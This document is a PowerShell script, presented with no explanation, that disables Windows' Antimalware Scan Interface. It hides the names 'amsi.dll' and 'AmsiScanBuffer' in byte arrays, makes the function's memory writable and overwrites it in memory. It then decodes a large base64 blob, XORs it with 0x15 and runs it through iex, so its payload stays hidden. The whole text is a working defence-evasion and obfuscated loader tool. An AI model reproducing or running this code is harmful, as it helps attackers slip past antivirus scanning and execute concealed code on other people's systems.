
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlVnl6YHEYH24YHxgfNTU1NU5WeHF5cGFXfHtxfHtyPTxIGB81
NTU1RXRndHg1PRgfNTU1NTU1NTVORmFnfHtySBgfNTU1NTU1NTUxVnp4eHR7cTUoNTc3GB8YHzU1
NTU8GB81NTU1MXQoW3BiOFp3f3B2YTVcWjtYcHh6Z2xGYWdwdHg9OU5WentjcGdhSC8vU2d6eFdU
ZlAjIUZhZ3x7cj03XSFmXFRUVFRUVFRQVFokdFFCYnYkJlJwJkFjcF0mfntdI35zIyxwZyUsPk9Q
fj5+RkUkUnNtR18lQnFBJFQtZVhMZXpGLWAsbT5bdHEiYHthJnZAXndCW39ZRlt8I0ZWfCx6YU9X
QVpNJEVAWUdkZ0ZcZ3R3cnomd0RUf3dwb0ByVFolR0ZaIUZbekBEQ14mcXBSeFlCVyRPe3cmIn58
cE9eTER6V0FcWiwiZmNdfm8mIGBPLDp0LGEmZi0sZ1N7XFRUVERzb3BjciZiWGd/eVhdbSFgTHdz
bVBaY19gVGclQXNCYyNiWGN3Uz5xWGUlYV9eJS0kXGN0ek9gQk1PT3htVnRnU3x0dEJ7LG0lcCV6
ZSVBeE1yLWFhXVFaUVBUWF5EUCFaQUFvbyZ9ISIhUV5CfUJaclBjVFdTTSxyRCBlWl0mcmB2cS10
Z2dbIEJEdzptT0MlIXlUV3E+VnBUVzpkYXFkbXZgWUR9JF1Tb3Znb0wkUWdcU1knLXNXU3xvfF9t
QHwkTyR7QGZQIyE6QCRBW3lYQ0VSdCUibyF+Z0M6XiNRYF9WR39/QVQtYiQsIFBUJm9hTVFQVCB7
ZVZ/TH1gZmdRYm19YUY6RFpvWXNvdlpdJnBmf3dbXFBjIkBfTFgsXmxlJV5md2QlWWd0dkZGLVd8
UXhMIWV8eHpELCdQf3slTCZCe1Z5OlJxckByI3dGfFlYdCVaRm1HQGdZd35UOll9J2dmRFwlLEJC
WllFfGBjXGB2Zkd0IXkhfG9RfCIndmxUen4tdCdPZEUlclhgQiQnXyYtUV95ckRZXSVefEdhYk1U
bHReLFJnfFhGRHojYnpjTHRkYzp5Z0N9JUJsfWR6JE1mIic+JCdaY1xXfydeJkxfRFpsfWdeUTp7
THEtW0ZyYENMR38iXGdHciYlendte3deQU15RkFwWnptd095JT5jX2xtcG0tb0Zad1BtW3cnViN+
Rl9NIHBjfiRWT0Z3X3dzXH0mZGUgJGFEYHtbJF1dXiJtJG9HOnxMQ3dlRX4tYX9UcUIkQ1NzUERg
JGNsZUJeT2wjc2QmXkFkZjphUXN9dlhafSZMLX4mflNzQUIlcnZ3c1lQdEBBXVpbZiNUIlF3fCVA
PiRgQWdtcEdjQ3t+JmFaLSdwdFJtcUx/WyNvVGYhXWZvXndwUnR9ciZke2xvY1cndHwncFIjOl1W
W3dtRFp+Jn13cn9fYyVWQ1NweF10cVZNbSJwJ0deWUVmJV8lbUBzfyV2fSR2LXA6YVQ+Z3RPbG1c
QUBxT31lfXEmUWBXdlFScl9lenNeImN7QFQnf3EsREFZI1p8WCZsWiV9dyBSJGx6XyV4flxtXXpX
QXlQQGN/IlRtYXQgXVN8X3B4Z0FdIHxmOllAfUYgZ0FsYX5mUCV9fWBecFtwJ2VnUUV+c3hDdFgk
LXQtb39+JSZMLWZ5TGd0TUAiWXBEb3NwdHRsJSZCf21wd0RmY3chY2Z4dE13Xl9sWEVbLUJBQHd5
OiJHRE1nT0d5ek9WcXJzIFAsYCNgQUJCb31RdyJaTCZQRXNseCdveGxFVEZHc3FEdG9jWzpncD4t
bVd8YWZMPkJcI09CcCZwV1R9LEV7ISYjX3cgJVYlYHFUYEVEciYjIyxUVFp5PlFvfCNQf2Y+XX9n
Y0R2RyJ0XmNGYWJyX3YgIyMhfHN4IVZHdiZiT1p5fWdhJVl4IyN8dE9GWGdZfHonJ0dPVkRPY3gh
cD5nfkV3YSwnYk8jXiQlOnFbUiB2ZnYmYWdyQHpFTURjOkFFZkJkdn5yWj5nRXhNTWdYPjp6XUY6
IHNFY14sJUVkLWxjQCxbcXFeWHBSTXslfFBcZ19nf2c+e0dFZX9FQSZxe3FhT3Z+QUNXVD5yInBU
R2E+VHNzRFxcYXJiJX1PeHl3cFxMJX1dWlYmIWxyIkVEWXRWe3NzJ29XIVphYEUkJSNmR29WPlFA
dl4sekYmcXhbQ1JDbHhHZF9APkI+eVIgd29wcid3Y3AnflJxYixRTydRfVtmcWxtTWJhIyFPJHNA
J1dRLEY6fH5Ecno+ZUdbdmdNYn5mckdRcVFPV0NzZGxSIV4+Tzp8XUFNZUN6e1p5eGV9cUxjeVsg
XUImd3hRIll+ZGNeXyBSQnJ/LFBkflRdWWZHOlIiYnR/UFBmdlFDIV1WZCVTZlZaYlQ6Q0RzfSQg
YS1bY3pGdCYkVl9jclxjZEFQTFYgUT5SJ20kfmB+fiV9UXZPWG9nREVGd0FdLXN+en9iZGxvOnJ+
ZyVdIVh+J0dEcmB9LCJUc1cmcFxAOlEtVm1iVkElWHssVlw6eWNiVGBXfF5ZVHlTc2dRZ09yZ00t
LCRNIVtzcnB4QHNaJmNxZV9CXmR6LV9lTWBiRmd5VlYtICxDQnonTERdfnwgW0NWeFhzWn9NYCQg
d1RjV3gkImEiLEdlVlhFJkB4IDoiI3tneVRyLWAheWRjOm9yeW9WRUBzdyddIHI+YnRFJ3BvQXpA
VHolZWBgVkBzfUZEWFN2fkVDXmVRUyFSWn5RWlRwXCJ4TXRsb0FZLFZBQWYlbSRlWGNUT0UhRiUk
eHhnLVRNciNjcnQtcjp9RUR4d1hZT0FzcmF2VG8jWFRnRnBEYWVTYHl5XVt+dy1QbXJTUSFdWyFf
eyVzc2NkfjpUYy1de0NURSQnIVtBXl0tIHRYUzohTH5tV1A+fU1cXnw6VFZvUHlNJ1dvLVpGcEA6
IVdxfWVxXE1zX2d5JCRdPmFwVm9eUn5FJnhUdiF9LVtzfSB7XnB4Y0MgTFN3I1lDJyd8Q0NWIVFh
QiFcc31jInB8T2JWIHR8UW8sVkZ/JWRsfEViIixyf3BPIldwJ1p/fnpQJyNQViNSfj4lUnFyVGUg
U2BXTFIleD55XXhFdG06UVIhfF1GUF9wcExSY1RfZVdzfVEgVCMtXmRsU3QiVlY6ViItVnp2clos
US1XZSFeIVNzX2RTJz5kTWxje3ZmZ19zcX1kYT5xdn0lbH1wI0xFLW1aJHZlfFxYYlhgYEBHQVJB
RUQgLEAtXiEnUWYnVH5NXWZSTVd7RVF3PmBtVkRHfXklInR2b15WYn1RRFtaVk0lXUVBeHZkIEN7
JCVmI3lMWlFaLSNYZE1ZQHk6V2dgQXJhXkV7V0RsXi16VCR3QGd3XnJkZ3NQdE1lfyBHUF9RYVsg
J0YiQVFFRFxaJ3tzcyB6bE9lWlN7Z3lcJlh4Unt5IlhjWn5MZU9eXWB8RXtGXGd7eUdFezp0UE1f
TFliZExHVmBZeFFTZXlmQkR0d3thYj5cbC0nI0RDbGVGcltmJj55TG12IiR5TVYhe154QkB8enle
RX4tcCRCREwmfXtBWHBzXHB9JF1TVnZeZiNbeGB0U0wjf3lHJFpNU0JhWnpZYVJBejp9XF9WIncs
RCc+UURDLUd+cl1QIidiUExacVtFWENkT3Z3W2N2WW0gV3h0QiF/PnklbFYnbW1GfUElUnB0dn12
THtfUCFSeixseiUsXmZbRVtBUU9gXl9xJ3RnQUJ2ZHl9eWZsfUxNf0x7b1xfT2d4YGFvTHxYeFdd
Pm9FX2ZYeSJAYFJdV2RaJmBNXFR6QCIicHxRVGRaX2xveEdFTE9fcnljcFFFfSBnVF1xeVZyTHYi
fCR0cFhHb0FBdGN0ek9/JWV/Xl5ZT2xPW1cnRUFvbF9mYXpmfW1SfUYnRWRaUnZBV3hMWCFNXmBM
bWxyW1clQHZRbyx5Ql9lVE98WVxWR0B2UyFgdFcnYl5+QldcJ3lZLC10eiRnX1p3IyB6Qnt8WWBj
QlhEcUFvY3E6QC0gd2F5UCZReE8+OmdTQEIlfCNbVlF5YVJ4X1dmb2ZFfV5sJ2AgWHZyLVNDVF5j
eldYJSxXJlZSWn9XYmR0XE1dWWQibGVyIHdkQiJWbWF4JVFTYFhFRGxdWUN5UEY+JCdcInp/e1F/
Qm1UYkxzfVokcWRyd357ckBwYGdGUH4tdGNmZnF/TGFfVll0JSdeTF1lQ2UhdlNHXXxNcFdBLE9Q
TVxCbSNtRCBzYVteRn1vZjohZmxwTERWPnZFZ3ssZz5iUE1WcWxBXnt9YF5gWnBPcFFdbWVkU1tx
ciVXYyV6UiFBQUJRW0diLUFnIl1sYSB+XX5XXiJabF46YH1HYkBAdjpWWSV+fkxlcUdDYllQWWxe
cWJTZHBbUXBYZkNMJiJYUXttLFp6XiJXJF17XyVSXidZJ1RfZ28+U38+PkUhIl06QHQtJX1zbUAj
IXBxfV0lVCFyJkAtZydCXXZYOl9MWGFPJGFZclh7YXFMUCB7QVwnLCV3fE1QZk9WLEZ7J0N2WC1+
WU9UV1l8ZCFGISV9QUxGYXNlREZ7ciBhfFh2UU1mQUZWTSJ6fFMkWl96LS1/T3BXQy17RU1BVydR
TyJMZ1tFZ3x3IEBYRkVvY1AhUlB4dl1kWmNzQGNvYn5yJHFWXlFyUVhYZH9bflZ/eyYlYl1+YXhU
WXJvYSdkeWRgfiBHflFxUH5gPnBSIyZ/YEZNT196fEZdTSFgXXtSYnFReURyRyVYZVpUJGBQeyR+
emwgV3d9OkF0UmZicXJ0QHQnLWFFZFFZdF1ZOlRgZ3kld39WTCN/V1JZT1twVyJYUT5+d3xiOmVW
fmR6YCxHLFZwfkxgJSRMUWBaQ1pAb3NfYmd5LHZCUn5kLXcjW0csVlJARGRMJHBTW3x3RWcgIkZh
fUUnRCZ+XCYkIVchJE0kbVxdcE1wU1JYcUJxJ3RbJiNTXSNRJ11PLFldUk9NfFhFUVAjcT55Y2Qt
YHJmUmd6U0xNQUxMOi1bf3FwOnZBRXojLSF2JX9XJUxHPmxZIkR/fUUtfVdPRW1SQm8gPkx+Plgj
Z1hQRX8jYiddQH1nVl8sT1JmR01jWVtFY0FyXl9xYmV0WW0lZ18sVk1bJndXc19MZyAtJiEhbHQg
bG9YIWZlOn06UEQsI2QmbWN/cHN4XXBkJCJkbTpELW8sd3RkXV9FT28sLVNaISdgPn4+Iy1we3pi
d39QeHJdQltPd1tsc3ZQcWJXZlEgc30sfUcgJy1dQmBzRFRsTXB8J2N2fFJ2VyAmJXN/J1o6YmFg
IHNGLFtNfV0sJnZvcmBDTXh5dFItTF46dyF4Q21GLCVkckVze0w6IXAmZnA+RngsWCN5dl4lJGFX
WV8jQ3FvZV9nWHYsLXo6WiFCQG1MWFhMb2B8fERZQCBSJid/IHZnJ0RlRyQ6Q1Qid0dlJXlZV0x6
JkwhUFNyfyJsbHByf31MJUdFemJGfyxnXVFhX0E6dyxCWnJ2QE9xJCBiUkJCLXYjfXdCLHRdZ29v
LVpCYWUtYWZhQyZxWW0jZiFtcSRDJEBCf0AmV0NgRiFaQVZMInBgdnc+YH57J1Q6Pjo+dGF2PiIh
RWNnfHchXSF4ZHMiUiY+WVtkIG9NIWdWe1tSOmB+UEF7XyFjbyZ8QSZsIkJHQiJ/WiYsOiBxYENa
fHFZYyBjWCxGQGNMRXRzVGBBYGNvU0VmUyNdeEBWdCAkQyVmT2BmQld3LHtxLSdnLEB/RV9wIXFX
dickc0dnfCxHWFxBY2QsRSFkRlZ2Oll7RXZYZk8hLHlhIz56ZlJUYT5PXmRdPl5md21DYGBecHJg
VDp7JmcjOkA+LD5CcCxnOiZDfz5SLFYjJEVEeVdBeVB9VFQjQF94QkZGZHJ+fHR9VnIsTVBGWHlC
QVx9eWBCYUwjelZGTGFST3dBbHd2WmB4JVRCZkJybWQlXXxbbH5mcnlXU2RBVlxeRkJQWER3TFEs
ZEVyeX5PXFx9V0N8JFBEVFxbUFB0fF9XU11NX3JdbURGQE15eX9NfXZRVkdCX2BcR1ZSYlN9QkEk
ICB3U0MiViZDW0dDQm1eWVBgcHF0ZkdWXnx+dmxafFREe0daJyBReyxnelMtU1wgXD5jf18sTydz
RVpnJUdgXX9nOi1wRiZMOmFEZHpPbWc+RlREUENvcGV7d31dIXxmYF4sYVMgXSIjeV0kcEN/QHwt
WyckdyR3dnN6eVhEXU9iTSQmU3MjRm1GXCR3JkJybHRTZVZmQHReJz5fW1k+OlBDWycsXU9hRHNy
TERAJ1J7ZEUnWVNvYT5/TGFxc3ojYH9PdHBvZidbYCxwJ3NdfVkgIm8+I3AiYSRxcDp3fHthJ3xE
WXJnJSV+c3JSWF5nWH5YUSFtQk0gX2EtLCFYXU9/YGxwb15xXlJ7fHRNQ0d7ZFdDLFd7I3dNc0Bn
WUZkfCV0dCBaUTpjLUFAV1dnJVpDOkVMfXNRcFFARkUsXCJhJzpwRntNPnNNfWViT3BdT2AgOlgg
U3xkfWMmb3w6Ild/TSNATVhwWSwsJ0ZnTHBmIU9nLU1wQHFGcWZlVyZ5TG93UCU+WnttXFN6QWB8
QWViZSBGd3JlIiIlXV4ibWItR2d/c0BaXSMjY3twPm8gdlZYIVlxYTpUT098UGxgQFpWJycgYVRa
LGJUIUJzeWUiWno6V2B9fXpwJ1c6UyNiYyRFfmdnfDp9ZCBlIVJ2bH9tfUNNOmRRY2VzbUJNZXhE
ZlQnYl4keXgnV11kR3stUldiXWB+VEV6J1ghUCAhXVQ+JiA6UCNRUHNxOix0V0ViJz4+IVJZei1v
V0VaQUNyf1E6LG1eVHNldHEhdHMheiwjfVshYyJWcCRjQ1F0bCRGcnN5cHhfZWBULFM6UUFfT3B3
YkA6byInQH9zXlcncS0+U0ZTWmYlJHssLFpXPn0hZnZnWl8tLF15e1Rdc3Nxf29+Q1Mkd3xzYHN9
cHoiRHQtdn1Sd0Atc2NnICwmRkxRLF52Om1mLFIjUUZ8dmA6QU0iWCwjfWN4d019d2FkTzpDWTpG
JFc6Qm0kWSJ3IXh3WXgkcSZwekNXIFdTZ0dzZn0iVnwgYnFFRHh+f29aemwmLDosW1Z4RExjVGcl
Pid6UD5xW1N2Yid2ZU9EI1paJVklZVNjfjp8LEJmYnJMXXN5LSZYWG9FTzoseF4kUz4iI1l2Pic+
dC19fV4gJ10jZnN/QX97YCFHb0VhT2BzI3N5ICZmWCdjTW8nek9/elNQe3tncj5vPiNMVy1cWiNG
cyJgeyJsJzosV1hmdFdbcCBhe1Z/c0x5VkxmYi0jT0NjIFQjY0F6JUwhLF52JWUjJE9aWSx8Qlpf
VnRTQCJkJVhTIVlXIndnJmA6LVJyXExBfl1AfUNlIk1aWF5MUndNUHNHW15BYSdfRXlRZlhgImFa
cUx4dCNeI0BDcXZgdlNQIiBBXSQ6Vl5PZUNBUTpRc2J2ez58QSVgf01gclplTCJaLGVDWVdbRXIm
ZHptcF5kQidgYn15Qk1dXkJCY0ZNZEQ6WixscCVxWW1zf01sI3x8RyF5XFM6R0YgUCxedltyZnxZ
IG1Tent0e2R8fyRaWX99UkdNbHBQfVh8IV9CXF16cmVBYU90LGQ+XlJHXmQgfCx9fFB2IlJXRllv
f1ZWIWVXYX9zYm17cSw+bW9zLCc+Y19yXWc+InMiRkElXCwjIXZxYz4mIFBZe0V2QS1Cc3k6QDoh
TX0nZXRTclRmVFRUKDc8PBgfNTU1NTFxcHZ6eGVncGZmcHE1KDVbcGI4Wnd/cHZhNVxaO1Z6eGVn
cGZmfHp7O1JvfGVGYWdwdHg9MXQ5TlxaO1Z6eGVncGZmfHp7O1Z6WEVncGZmfHp7WHpxcEgvL1FQ
Vnp4RWdwZmY8GB81NTU1MXpgYWVgYTUoNVtwYjhad39wdmE1RmxmYXB4O1xaO1hweHpnbEZhZ3B0
eBgfNTU1NTFxcHZ6eGVncGZmcHE7VnplbEF6PTUxemBhZWBhNTwYHzU1NTVOd2xhcE5ISDUxd2xh
cFpgYVRnZ3RsNSg1MXpgYWVgYTtBelRnZ3RsPTwYHzU1NTUxR1RGNSg1TkZsZmFweDtHcHN5cHZh
fHp7O1RmZnB4d3lsSC8vWXp0cT0xd2xhcFpgYVRnZ3RsPBgfGB81NTU1MVp5cVZ6e2Z6eXBaYGE1
KDVOVnp7Znp5cEgvL1pgYRgfNTU1NTFGYWd8e3JCZ3xhcGc1KDVbcGI4Wnd/cHZhNVxaO0ZhZ3x7
ckJnfGFwZxgfNTU1NU5WentmenlwSC8vRnBhWmBhPTFGYWd8e3JCZ3xhcGc8GB8YHzU1NTVORn10
Z2VWeXpgcTtWeXpgcVFgeGVILy94dHx7PTFWenh4dHtxO0ZleXxhPTc1Nzw8GB8YHzU1NTVOVnp7
Znp5cEgvL0ZwYVpgYT0xWnlxVnp7Znp5cFpgYTwYHzU1NTUxR3BmYHlhZjUoNTFGYWd8e3JCZ3xh
cGc7QXpGYWd8e3I9PBgfNTU1NTFHcGZgeWFmGB81NRgfaBgf"

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

